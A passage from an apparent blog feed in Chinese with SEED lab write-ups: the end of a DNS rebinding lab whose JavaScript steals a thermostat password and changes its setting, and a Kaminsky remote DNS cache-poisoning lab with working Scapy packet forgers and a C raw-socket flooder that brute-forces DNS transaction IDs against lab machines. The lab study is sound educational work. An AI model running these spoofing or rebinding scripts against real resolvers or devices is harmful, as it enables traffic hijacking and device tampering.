id="task-6：理解同源策略保护"><a href="#task-6：理解同源策略保护" class="headerlink" title="task 6：理解同源策略保护"></a>task 6：理解同源策略保护</h3><p>参考blog：<a href="https://www.jianshu.com/p/6c6f277fa189" target="_blank" rel="noopener">一文了解同源策略细节</a></p><p>点击第二个网页上面的按钮，即: <code>http://www.seedIoT32.com:8080/change</code>上面的click按钮，此时温度计显示为99摄氏度，而当我们点击第三个连接上面的按钮的时候，即<code>http://www.attacker32.com:8080/change</code>上面的click按钮，此时温度计显示温度不发生改变</p><p>对比两个不同URL上面的Web Console</p><p><code>http://www.seedIoT32.com:8080/change</code></p><p><img src="/2020/11/19/DNS-Rebinding-Attack-lab/6-1.PNG" srcset="/img/loading.gif" alt="6-1"></p><p><code>http://www.attacker32.com:8080/change</code></p><p><img src="/2020/11/19/DNS-Rebinding-Attack-lab/6-2.PNG" srcset="/img/loading.gif" alt="6-2"></p><p>同源策略的描述</p><blockquote><p>就是只有Js脚本和Html模块必须在同一个源下，Js脚本才能读取或处理Html模块。如果Js脚本在另一个源，如域名<a href="http://www.hack.com，则这个Js脚本不能读取别域名下如www.chaoshi.com的Html模块&gt;" target="_blank" rel="noopener">www.hack.com，则这个Js脚本不能读取别域名下如www.chaoshi.com的Html模块&gt;</a></p></blockquote><h3 id="task-7：击败同源保护策略"><a href="#task-7：击败同源保护策略" class="headerlink" title="task 7：击败同源保护策略"></a>task 7：击败同源保护策略</h3><p>修改对应的js文件</p><p><img src="/2020/11/19/DNS-Rebinding-Attack-lab/7-1.PNG" srcset="/img/loading.gif" alt="7-1"></p><p>之后重启web服务器，可以看到已经没有错误消息了</p><p><img src="/2020/11/19/DNS-Rebinding-Attack-lab/7-2.PNG" srcset="/img/loading.gif" alt="7-2"></p><p><strong>解释</strong>：分析对应的js文件，此时是从<code>www.attacker32.com</code>来读取对应的html元素，并且进行修改，此时并不会访问<code>www.seedIoT32.com:8080</code>的温度计，所以这时候是同源访问，进而不会显示同源错误</p><p><img src="/2020/11/19/DNS-Rebinding-Attack-lab/7-3.PNG" srcset="/img/loading.gif" alt="7-3"></p><p>可以看到此时温度计温度已经改为了99摄氏度</p><h3 id="task-8：执行攻击"><a href="#task-8：执行攻击" class="headerlink" title="task 8：执行攻击"></a>task 8：执行攻击</h3><p>修改对应的js文件</p><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> url_prefix = <span class="hljs-string">'http://www.attacker32.com:8080'</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">updateTemperature</span>(<span class="hljs-params"></span>) </span>&#123;  $.<span class="hljs-keyword">get</span>(url_prefix + '/password', function(data) &#123;$.post(url_prefix + <span class="hljs-string">'/temperature?value=88'</span>                 + <span class="hljs-string">'&amp;password='</span>+ data.password,                <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;                  <span class="hljs-built_in">console</span>.debug(<span class="hljs-string">'Got a response from the server!'</span>);               &#125;);  &#125;);&#125;button = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"change"</span>);button.addEventListener(<span class="hljs-string">"click"</span>, updateTemperature);</code></pre><p>之后和上面一样，先在.zone区域中<code>www.attacker32.com</code>对应10.0.2.7（attacker VM）的时候先访问对应的网页，之后修改.zone文件，让<code>www.attacker32.com</code>对应用户的IP地址，之后就可以修改温度计示数</p><p><img src="/2020/11/19/DNS-Rebinding-Attack-lab/8-2.PNG" srcset="/img/loading.gif" alt="8-2"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Network Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Remote DNS Attack lab</title>
    <link href="/2020/11/16/Remote-DNS-Attack-lab/"/>
    <url>/2020/11/16/Remote-DNS-Attack-lab/</url>
    
    <content type="html"><![CDATA[<h1 id="Remote-DNS-Attack"><a href="#Remote-DNS-Attack" class="headerlink" title="Remote DNS Attack"></a>Remote DNS Attack</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><ul><li><p>在这个实验中更加专注于DNS缓存中毒攻击，而相比于之前的local DNS Attack（攻击者和受害者DNS服务器在一个子网上面），这个实验不允许进行数据包的嗅探</p></li><li><p><img src="/2020/11/16/Remote-DNS-Attack-lab/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p></li><li><p>其次，对应的主机设置</p><ul><li><p><strong>用户主机（10.0.2.4）</strong></p><p>  <img src="/2020/11/16/Remote-DNS-Attack-lab/1-2.PNG" srcset="/img/loading.gif" alt="1-2"></p></li><li><p><strong>DNS Server（10.0.2.5）</strong></p><p>  <img src="/2020/11/16/Remote-DNS-Attack-lab/1-3.PNG" srcset="/img/loading.gif" alt="1-3"></p></li><li><p><strong>Attacker（10.0.2.7）</strong></p><p>  <img src="/2020/11/16/Remote-DNS-Attack-lab/1-4.PNG" srcset="/img/loading.gif" alt="1-4"></p></li></ul></li></ul><h2 id="Setup-Task"><a href="#Setup-Task" class="headerlink" title="Setup Task"></a>Setup Task</h2><h3 id="task-1：配置用户虚拟机"><a href="#task-1：配置用户虚拟机" class="headerlink" title="task 1：配置用户虚拟机"></a>task 1：配置用户虚拟机</h3><p>当配置完成之后，运行dig <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p><p><img src="/2020/11/16/Remote-DNS-Attack-lab/1-5.PNG" srcset="/img/loading.gif" alt="1-5"></p><p>可以看到当10.0.2.5的DNS缓存有相应条目的时候，会返回给用户主机，所以本地DNS服务器是10.0.2.5，配置正确</p><h3 id="task-2：配置本地DNS服务器"><a href="#task-2：配置本地DNS服务器" class="headerlink" title="task 2：配置本地DNS服务器"></a>task 2：配置本地DNS服务器</h3><p>修改对应的/etc/bind/named.conf</p><p><img src="/2020/11/16/Remote-DNS-Attack-lab/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p><p>对应的/etc/bind/named.cong.options</p><p><img src="/2020/11/16/Remote-DNS-Attack-lab/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p><h3 id="task-3：配置攻击者主机"><a href="#task-3：配置攻击者主机" class="headerlink" title="task 3：配置攻击者主机"></a>task 3：配置攻击者主机</h3><p><img src="/2020/11/16/Remote-DNS-Attack-lab/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p><p><img src="/2020/11/16/Remote-DNS-Attack-lab/3-2.PNG" srcset="/img/loading.gif" alt="3-2"></p><h3 id="task-4：测试配置"><a href="#task-4：测试配置" class="headerlink" title="task 4：测试配置"></a>task 4：测试配置</h3><h4 id="step-1：获取ns-attacker32-com的IP地址"><a href="#step-1：获取ns-attacker32-com的IP地址" class="headerlink" title="step 1：获取ns.attacker32.com的IP地址"></a>step 1：获取ns.attacker32.com的IP地址</h4><p>输入下面命令，会得到相应的运行结果</p><pre><code class="hljs css"><span class="hljs-selector-tag">dig</span> <span class="hljs-selector-tag">ns</span><span class="hljs-selector-class">.attacker32</span><span class="hljs-selector-class">.com</span></code></pre><p><img src="/2020/11/16/Remote-DNS-Attack-lab/4-1.PNG" srcset="/img/loading.gif" alt="4-1"></p><p>通过task3的文件内容可以知道对应的IP地址就是10.0.2.9，正确</p><h4 id="step-2：获取www-example-com的IP地址"><a href="#step-2：获取www-example-com的IP地址" class="headerlink" title="step 2：获取www.example.com的IP地址"></a>step 2：获取<a href="http://www.example.com的IP地址" target="_blank" rel="noopener">www.example.com的IP地址</a></h4><ul><li>首先是把DNS查询记录发向官方的nameserver</li></ul><pre><code class="hljs css"><span class="hljs-selector-tag">dig</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span></code></pre><p><img src="/2020/11/16/Remote-DNS-Attack-lab/4-2.PNG" srcset="/img/loading.gif" alt="4-2"></p><ul><li>之后是将DNS query发往ns.attacker32.com服务器</li></ul><pre><code class="hljs stylus">dig @ns<span class="hljs-selector-class">.attacker32</span><span class="hljs-selector-class">.com</span> www<span class="hljs-selector-class">.example</span>.com</code></pre><p>由于此时ns.attacker32.com对应的IP地址是10.0.2.9，按理来说需要向这台命名服务器来进行进一步的询问，但是10.0.2.9是unreachable的</p><p><img src="/2020/11/16/Remote-DNS-Attack-lab/4-3.PNG" srcset="/img/loading.gif" alt="4-3"></p><h2 id="The-Attack-Tasks"><a href="#The-Attack-Tasks" class="headerlink" title="The Attack Tasks"></a>The Attack Tasks</h2><ul><li><strong>原理：</strong>是在进行DNS查询的时候进行攻击，正常情况下，当user访问<a href="http://www.example.com的时候，会到本地DNS服务器进行查询，而当本地DNS服务器不具备对应条目的时候，会从根服务器开始进行迭代查询，而我们所需要做的就是将虚假的条目插入到本地DNS服务器当中，让他访问一个虚假的/恶意的主机" target="_blank" rel="noopener">www.example.com的时候，会到本地DNS服务器进行查询，而当本地DNS服务器不具备对应条目的时候，会从根服务器开始进行迭代查询，而我们所需要做的就是将虚假的条目插入到本地DNS服务器当中，让他访问一个虚假的/恶意的主机</a></li></ul><h3 id="Kaminsky-attack"><a href="#Kaminsky-attack" class="headerlink" title="Kaminsky attack"></a>Kaminsky attack</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>attacker向user的本地DNS服务器发送一个请求，不攻击的情况下是</p><p><img src="/2020/11/16/Remote-DNS-Attack-lab/5-1.PNG" srcset="/img/loading.gif" alt="5-1"></p><p>而当我们在（2）进行完之后让attacker向DNS服务器发送spoofed的DNS回应的时候就可以进行注入</p><p><img src="/2020/11/16/Remote-DNS-Attack-lab/5-2.PNG" srcset="/img/loading.gif" alt="5-2"></p><h4 id="task-4：构建DNS请求报文"><a href="#task-4：构建DNS请求报文" class="headerlink" title="task 4：构建DNS请求报文"></a>task 4：构建DNS请求报文</h4><p>首先先通过python来查看DNS报文格式以及查询报文格式</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>ls(DNS)length     : ShortField (Cond)                   = (<span class="hljs-literal">None</span>)id         : ShortField                          = (<span class="hljs-number">0</span>)qr         : BitField  (<span class="hljs-number">1</span> bit)                   = (<span class="hljs-number">0</span>)opcode     : BitEnumField  (<span class="hljs-number">4</span> bits)              = (<span class="hljs-number">0</span>)aa         : BitField  (<span class="hljs-number">1</span> bit)                   = (<span class="hljs-number">0</span>)tc         : BitField  (<span class="hljs-number">1</span> bit)                   = (<span class="hljs-number">0</span>)rd         : BitField  (<span class="hljs-number">1</span> bit)                   = (<span class="hljs-number">1</span>)ra         : BitField  (<span class="hljs-number">1</span> bit)                   = (<span class="hljs-number">0</span>)z          : BitField  (<span class="hljs-number">1</span> bit)                   = (<span class="hljs-number">0</span>)ad         : BitField  (<span class="hljs-number">1</span> bit)                   = (<span class="hljs-number">0</span>)cd         : BitField  (<span class="hljs-number">1</span> bit)                   = (<span class="hljs-number">0</span>)rcode      : BitEnumField  (<span class="hljs-number">4</span> bits)              = (<span class="hljs-number">0</span>)qdcount    : DNSRRCountField                     = (<span class="hljs-literal">None</span>)ancount    : DNSRRCountField                     = (<span class="hljs-literal">None</span>)nscount    : DNSRRCountField                     = (<span class="hljs-literal">None</span>)arcount    : DNSRRCountField                     = (<span class="hljs-literal">None</span>)qd         : DNSQRField                          = (<span class="hljs-literal">None</span>)an         : DNSRRField                          = (<span class="hljs-literal">None</span>)ns         : DNSRRField                          = (<span class="hljs-literal">None</span>)ar         : DNSRRField                          = (<span class="hljs-literal">None</span>)<span class="hljs-meta">&gt;&gt;&gt; </span>ls(DNSQR)qname      : DNSStrField                         = (<span class="hljs-string">b'www.example.com'</span>)qtype      : ShortEnumField                      = (<span class="hljs-number">1</span>)qclass     : ShortEnumField                      = (<span class="hljs-number">1</span>)</code></pre><ul><li><strong>具体代码如下</strong></li></ul><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *Qdsec = DNSQR(qname =<span class="hljs-string">'www.example.com'</span>)dns = DNS(id=<span class="hljs-number">0xAAAA</span>, qr=<span class="hljs-number">0</span>, qdcount=<span class="hljs-number">1</span>, ancount=<span class="hljs-number">0</span>, nscount=<span class="hljs-number">0</span>,arcount=<span class="hljs-number">0</span>, qd=Qdsec)ip = IP(dst=<span class="hljs-string">'10.0.2.5'</span>, src=<span class="hljs-string">'10.0.2.7'</span>)udp = UDP(dport=<span class="hljs-number">53</span>, sport=<span class="hljs-number">33333</span>, chksum=<span class="hljs-number">0</span>)request = ip/udp/dnssend(request)</code></pre><p>之后在wireshark上面可以抓到对应的response的包，能够看到<strong>真正的<a href="http://www.example.com的IP地址（93.184.216.34）" target="_blank" rel="noopener">www.example.com的IP地址（93.184.216.34）</a></strong>，可见是DNS服务器进行了从根目录开始的查询</p><p><img src="/2020/11/16/Remote-DNS-Attack-lab/5-3.PNG" srcset="/img/loading.gif" alt="5-3"></p><p>之后将DNS缓存进行转存</p><pre><code class="hljs gradle">sudo rndc dumpdb -cachesudo cat <span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/bind/</span><span class="hljs-keyword">dump</span>.db</code></pre><p>可看到对应条目已经在DNS缓存当中</p><p><img src="/2020/11/16/Remote-DNS-Attack-lab/5-4.PNG" srcset="/img/loading.gif" alt="5-4"></p><h4 id="task-5：欺骗DNS-reply"><a href="#task-5：欺骗DNS-reply" class="headerlink" title="task 5：欺骗DNS reply"></a>task 5：欺骗DNS reply</h4><p>具体code</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *name = <span class="hljs-string">'www.example.com'</span>       <span class="hljs-comment">#对应的查询报文端中的hostname</span>domain = <span class="hljs-string">'example.com'</span>         <span class="hljs-comment">#上面name所属的域名</span>ns = <span class="hljs-string">'ns.attacker32.com'</span>       <span class="hljs-comment">#这个域名的nameserver</span>Qdsec = DNSQR(qname=name)  Anssec = DNSRR(rrname=name, type=<span class="hljs-string">'A'</span>, rdata=<span class="hljs-string">'1.2.3.4'</span>, ttl=<span class="hljs-number">259200</span>)NSsec = DNSRR(rrname=domain, type=<span class="hljs-string">'NS'</span>, rdata=ns, ttl=<span class="hljs-number">259200</span>)dns = DNS(id=<span class="hljs-number">0xAAAA</span>, aa=<span class="hljs-number">1</span>, rd=<span class="hljs-number">1</span>, qr=<span class="hljs-number">1</span>, qdcount=<span class="hljs-number">1</span>,          ancount=<span class="hljs-number">1</span>, nscount=<span class="hljs-number">1</span>, arcount=<span class="hljs-number">0</span>,          qd=Qdsec, an=Anssec, ns=NSsec)ip = IP(dst=<span class="hljs-string">'10.0.2.5'</span>, src=<span class="hljs-string">'199.43.135.53'</span>)      <span class="hljs-comment">#10.0.2.5是本地DNS服务器的地址，而199.43.135.53是example.com域的权威服务器的IP地址</span>udp = UDP(dport=<span class="hljs-number">33333</span>, sport=<span class="hljs-number">53</span>, chksum=<span class="hljs-number">0</span>)reply = ip/udp/dnssend(reply)</code></pre><p>运行后进行wireshark抓包</p><p><img src="/2020/11/16/Remote-DNS-Attack-lab/5-5.png" srcset="/img/loading.gif" alt="5-5"></p><p>可以看到对应的<a href="http://www.example.com的IP地址已经变为了1.2.3.4" target="_blank" rel="noopener">www.example.com的IP地址已经变为了1.2.3.4</a></p><p><strong>但是此时将对应的DNS缓存打印出来，会发现并没有对应条目，猜测是只有在本地DNS服务器向外发送DNS query之后，如果收到了匹配的DNS response，才会存储在DNS缓存中</strong></p><h4 id="task-6：发动kaminsky-attack"><a href="#task-6：发动kaminsky-attack" class="headerlink" title="task 6：发动kaminsky attack"></a>task 6：发动kaminsky attack</h4><p>具体code如下</p><ul><li>首先是负责构造reply报文格式的py文件</li></ul><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *<span class="hljs-comment"># Construct the DNS header and payload</span>name = <span class="hljs-string">'zzzzz.example.com'</span>domain = <span class="hljs-string">'example.com'</span>ns = <span class="hljs-string">'ns.attacker32.com'</span>Qdsec = DNSQR(qname=name)Anssec = DNSRR(rrname=name, type=<span class="hljs-string">'A'</span>, rdata=<span class="hljs-string">'1.1.2.2'</span>, ttl=<span class="hljs-number">259200</span>)NSsec = DNSRR(rrname = domain, type = <span class="hljs-string">'NS'</span>, rdata = ns, ttl = <span class="hljs-number">259200</span>)Addsec = DNSRR(rrname = ns, type = <span class="hljs-string">'A'</span>, rdata = <span class="hljs-string">'10.0.2.7'</span>,ttl = <span class="hljs-number">259200</span>)dns = DNS(id=<span class="hljs-number">0xAAAA</span>, aa=<span class="hljs-number">1</span>, rd=<span class="hljs-number">0</span>, qr=<span class="hljs-number">1</span>,qdcount=<span class="hljs-number">1</span>, ancount=<span class="hljs-number">1</span>, nscount=<span class="hljs-number">1</span>, arcount=<span class="hljs-number">1</span>,qd=Qdsec, an=Anssec, ns = NSsec, ar = Addsec)<span class="hljs-comment"># Construct the IP, UDP headers, and the entire packet</span>ip = IP(dst=<span class="hljs-string">'10.0.2.5'</span>, src=<span class="hljs-string">'199.43.135.53'</span>, chksum=<span class="hljs-number">0</span>)udp = UDP(dport=<span class="hljs-number">33333</span>, sport=<span class="hljs-number">53</span>, chksum=<span class="hljs-number">0</span>)pkt = ip/udp/dns<span class="hljs-comment"># Save the packet to a file</span><span class="hljs-keyword">with</span> open(<span class="hljs-string">'ip_resp.bin'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:    f.write(bytes(pkt))</code></pre><ul><li>其次是构造request报文格式的py文件</li></ul><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *ip = IP(dst = <span class="hljs-string">'10.0.2.5'</span>)udp = UDP(dport = <span class="hljs-number">53</span>, chksum = <span class="hljs-number">0</span>)name = <span class="hljs-string">'zzzzz.example.com'</span>Qdsec = DNSQR(qname=name)dns = DNS(id=<span class="hljs-number">0x100</span>, qr=<span class="hljs-number">0</span>, qdcount=<span class="hljs-number">1</span>, qd=Qdsec)query = ip/udp/dns<span class="hljs-keyword">with</span> open(<span class="hljs-string">'ip_req.bin'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:    f.write(bytes(query))</code></pre><ul><li>最后是进行发送以及欺骗的c文件</li></ul><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;arpa/inet.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_FILE_SIZE 1000000</span><span class="hljs-comment">/* IP Header */</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipheader</span> &#123;</span>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>      iph_ihl:<span class="hljs-number">4</span>, <span class="hljs-comment">//IP header length</span>                     iph_ver:<span class="hljs-number">4</span>; <span class="hljs-comment">//IP version</span>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>      iph_tos; <span class="hljs-comment">//Type of service</span>    <span class="hljs-keyword">unsigned</span> short <span class="hljs-keyword">int</span> iph_len; <span class="hljs-comment">//IP Packet length (data + header)</span>    <span class="hljs-keyword">unsigned</span> short <span class="hljs-keyword">int</span> iph_ident; <span class="hljs-comment">//Identification</span>    <span class="hljs-keyword">unsigned</span> short <span class="hljs-keyword">int</span> iph_flag:<span class="hljs-number">3</span>, <span class="hljs-comment">//Fragmentation flags</span>                     iph_offset:<span class="hljs-number">13</span>; <span class="hljs-comment">//Flags offset</span>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>      iph_ttl; <span class="hljs-comment">//Time to Live</span>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>      iph_protocol; <span class="hljs-comment">//Protocol type</span>    <span class="hljs-keyword">unsigned</span> short <span class="hljs-keyword">int</span> iph_chksum; <span class="hljs-comment">//IP datagram checksum</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">in_addr</span>    <span class="hljs-title">iph_sourceip</span>;</span> <span class="hljs-comment">//Source IP address </span>    <span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">in_addr</span>    <span class="hljs-title">iph_destip</span>;</span>   <span class="hljs-comment">//Destination IP address </span>&#125;;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">send_raw_packet</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * <span class="hljs-built_in">buffer</span>, <span class="hljs-keyword">int</span> pkt_size)</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">send_dns_request</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *ip_req, <span class="hljs-keyword">int</span> n)</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">send_dns_response</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *ip_resp, <span class="hljs-keyword">int</span> n)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">long</span> i = <span class="hljs-number">0</span>;    srand(time(<span class="hljs-literal">NULL</span>));    <span class="hljs-comment">// Load the DNS request packet from file</span>    FILE * f_req = fopen(<span class="hljs-string">"ip_req.bin"</span>, <span class="hljs-string">"rb"</span>);    <span class="hljs-keyword">if</span> (!f_req) &#123;        perror(<span class="hljs-string">"Can't open 'ip_req.bin'"</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);    &#125;    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> ip_req[MAX_FILE_SIZE];    <span class="hljs-keyword">int</span> n_req = fread(ip_req, <span class="hljs-number">1</span>, MAX_FILE_SIZE, f_req);    <span class="hljs-comment">// Load the first DNS response packet from file</span>    FILE * f_resp = fopen(<span class="hljs-string">"ip_resp.bin"</span>, <span class="hljs-string">"rb"</span>);    <span class="hljs-keyword">if</span> (!f_resp) &#123;        perror(<span class="hljs-string">"Can't open 'ip_resp.bin'"</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);    &#125;    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> ip_resp[MAX_FILE_SIZE];    <span class="hljs-keyword">int</span> n_resp = fread(ip_resp, <span class="hljs-number">1</span>, MAX_FILE_SIZE, f_resp);    <span class="hljs-keyword">char</span> a[<span class="hljs-number">26</span>]=<span class="hljs-string">"abcdefghijklmnopqrstuvwxyz"</span>;    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;        <span class="hljs-keyword">unsigned</span> short transaction_id = <span class="hljs-number">0</span>;        <span class="hljs-comment">// Generate a random name with length 5</span>        <span class="hljs-keyword">char</span> name[<span class="hljs-number">5</span>];        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k=<span class="hljs-number">0</span>; k&lt;<span class="hljs-number">5</span>; k++)              name[k] = a[rand() % <span class="hljs-number">26</span>];        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"attempt #%ld. request is [%s.example.com], transaction ID is: [%hu]\n"</span>,              ++i, name, transaction_id);        <span class="hljs-comment">//##################################################################</span>        <span class="hljs-comment">/* Step 1. Send a DNS request to the targeted local DNS server</span><span class="hljs-comment">              This will trigger it to send out DNS queries */</span>        <span class="hljs-comment">// ... Students should add code here.</span><span class="hljs-built_in">memcpy</span>(ip_req+<span class="hljs-number">41</span>, name, <span class="hljs-number">5</span>);        send_dns_request(ip_req, n_req);        <span class="hljs-comment">// Step 2. Send spoofed responses to the targeted local DNS server.</span>            <span class="hljs-comment">// ... Students should add code here.</span>        <span class="hljs-built_in">memcpy</span>(ip_resp+<span class="hljs-number">41</span>, name, <span class="hljs-number">5</span>);        <span class="hljs-built_in">memcpy</span>(ip_resp+<span class="hljs-number">64</span>, name, <span class="hljs-number">5</span>);        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">5000</span> ; i++)        &#123;            <span class="hljs-keyword">unsigned</span> short id =rand();            <span class="hljs-keyword">unsigned</span> short id_net_order = htons(id);            <span class="hljs-built_in">memcpy</span>(ip_resp+<span class="hljs-number">28</span>, &amp;id_net_order, <span class="hljs-number">2</span>);            send_dns_response(ip_resp, n_resp);        &#125;         <span class="hljs-comment">//##################################################################</span>    &#125;&#125;<span class="hljs-comment">/* Use for sending DNS request.</span><span class="hljs-comment"> * Add arguments to the function definition if needed.</span><span class="hljs-comment"> * */</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">send_dns_request</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *ip_req, <span class="hljs-keyword">int</span> n)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-comment">// Students need to implement this function</span>    send_raw_packet(ip_req, n);&#125;<span class="hljs-comment">/* Use for sending forged DNS response.</span><span class="hljs-comment"> * Add arguments to the function definition if needed.</span><span class="hljs-comment"> * */</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">send_dns_response</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *ip_resp, <span class="hljs-keyword">int</span> n)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-comment">// Students need to implement this function</span>    send_raw_packet(ip_resp, n);&#125;<span class="hljs-comment">/* Send the raw packet out </span><span class="hljs-comment"> *    buffer: to contain the entire IP packet, with everything filled out.</span><span class="hljs-comment"> *    pkt_size: the size of the buffer.</span><span class="hljs-comment"> * */</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">send_raw_packet</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * <span class="hljs-built_in">buffer</span>, <span class="hljs-keyword">int</span> pkt_size)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">dest_info</span>;</span>    <span class="hljs-keyword">int</span> enable = <span class="hljs-number">1</span>;    <span class="hljs-comment">// Step 1: Create a raw network socket.</span>    <span class="hljs-keyword">int</span> sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);    <span class="hljs-comment">// Step 2: Set socket option.</span>    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,     &amp;enable, <span class="hljs-keyword">sizeof</span>(enable));    <span class="hljs-comment">// Step 3: Provide needed information about destination.</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipheader</span> *<span class="hljs-title">ip</span> = (<span class="hljs-title">struct</span> <span class="hljs-title">ipheader</span> *) <span class="hljs-title">buffer</span>;</span>    dest_info.sin_family = AF_INET;    dest_info.sin_addr = ip-&gt;iph_destip;    <span class="hljs-comment">// Step 4: Send the packet out.</span>    sendto(sock, <span class="hljs-built_in">buffer</span>, pkt_size, <span class="hljs-number">0</span>,       (struct sockaddr *)&amp;dest_info, <span class="hljs-keyword">sizeof</span>(dest_info));    <span class="hljs-built_in">close</span>(sock);&#125;</code></pre><p>之后进行DNS缓存的存储以及查找对应的条目</p><p><img src="/2020/11/16/Remote-DNS-Attack-lab/6-1.PNG" srcset="/img/loading.gif" alt="6-1"></p><p>可以看到对应条目已经出现，成功</p><h4 id="task-7：检查结果"><a href="#task-7：检查结果" class="headerlink" title="task 7：检查结果"></a>task 7：检查结果</h4><p>在用户主机上面分别运行dig命令</p><pre><code class="hljs stylus">dig www<span class="hljs-selector-class">.example</span>.comdig @ns<span class="hljs-selector-class">.attacker32</span><span class="hljs-selector-class">.com</span> www<span class="hljs-selector-class">.example</span>.com</code></pre><p>可以看到对应的结果是一样的，此时DNS本地服务器缓存中毒攻击成功</p><p><img src="/2020/11/16/Remote-DNS-Attack-lab/7-1.PNG" srcset="/img/loading.gif" alt="7-1"></p><p><img src="/2020/11/16/Remote-DNS-Attack-lab/7-2.PNG" srcset="/img/loading.gif" alt="7-2"></p>]]></content>
    
    
    
    <tags>
      
      <tag>NetWork Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>电子邮件中DANE生态系统的纵向综合研究</title>
    <link href="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/"/>
    <url>/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/</url>
    
